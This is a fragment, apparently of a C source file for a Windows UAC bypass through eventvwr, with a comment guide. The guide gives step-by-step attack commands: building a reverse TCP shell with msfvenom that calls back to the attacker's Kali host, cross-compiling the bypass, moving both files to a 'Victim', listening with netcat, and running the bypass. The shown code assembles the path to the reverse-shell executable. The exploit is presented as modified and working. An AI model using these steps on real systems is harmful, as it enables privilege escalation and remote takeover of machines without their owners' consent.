...
Guide
    1. Kali: sudo msfvenom -p windows/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe -o reverse_3333.exe
    2. Kali: x86_64-w64-mingw32-gcc eventvwr-bypassuac.c -o eventvwr-bypassuac-64.exe
    3. Transfer both files to Victim
    4. Kali: rlwrap -r nc -lvnp 3333
    5. Victim: eventvwr-bypassuac-64.exe

Link: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
...
void __c_exploitUAC() {
	...
	*/
	...
	/*
    Already modified and working if you followed above steps
...
Default:
    ...
    */
	GetCurrentDirectory(MAX_PATH, curPath);
	strcat(curPath, "\\reverse_3333.exe");
